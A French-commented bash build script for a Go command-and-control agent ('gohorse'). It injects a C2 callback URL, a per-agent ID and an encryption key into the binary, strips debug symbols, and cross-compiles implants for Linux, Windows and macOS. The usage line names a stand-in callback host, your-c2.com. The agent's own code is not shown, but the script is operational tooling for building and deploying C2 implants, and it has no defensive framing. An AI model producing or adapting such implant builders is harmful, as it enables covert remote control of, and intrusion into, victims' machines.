#!/bin/bash

# Ce script compile l'agent Go pour différentes plateformes,
# en injectant l'URL du C2, un ID d'agent unique, et une clé de chiffrement.

# --- Configuration ---
AGENT_ID=$1
C2_URL=$2
ENCRYPTION_KEY=$3
OUTPUT_DIR="../../bin"

# --- Validation ---
if [ -z "$AGENT_ID" ] || [ -z "$C2_URL" ] || [ -z "$ENCRYPTION_KEY" ]; then
  echo "Usage: ./build.sh <agent-id> <c2-url> <encryption-key>"
  echo "Example: ./build.sh agent-007 http://your-c2.com/callback $(openssl rand -hex 16)"
  exit 1
fi

if [ ${#ENCRYPTION_KEY} -ne 32 ]; then
    echo "Error: Encryption key must be 32 characters long."
    exit 1
fi

# --- Préparation ---
BASE_NAME="gohorse-$AGENT_ID"
LDFLAGS=(
  "-w -s" # Réduit la taille du binaire
  "-X main.AgentID=$AGENT_ID"
  "-X main.C2_URL=$C2_URL"
  "-X main.EncryptionKey=$ENCRYPTION_KEY"
)

# Convertit le tableau en une seule chaîne
LDFLAGS_STR="$(IFS=' '; echo "${LDFLAGS[*]}")"

mkdir -p $OUTPUT_DIR

# --- Compilation ---
echo "[+] Compiling for Linux (amd64)..."
GOOS=linux GOARCH=amd64 go build -ldflags="$LDFLAGS_STR" -o "$OUTPUT_DIR/$BASE_NAME-linux-amd64" main.go crypto.go

echo "[+] Compiling for Windows (amd64)..."
GOOS=windows GOARCH=amd64 go build -ldflags="$LDFLAGS_STR" -o "$OUTPUT_DIR/$BASE_NAME-windows-amd64.exe" main.go crypto.go

echo "[+] Compiling for macOS (amd64)..."
GOOS=darwin GOARCH=amd64 go build -ldflags="$LDFLAGS_STR" -o "$OUTPUT_DIR/$BASE_NAME-macos-amd64" main.go crypto.go

echo "[+] Compilation terminée. Binaires disponibles dans $OUTPUT_DIR"
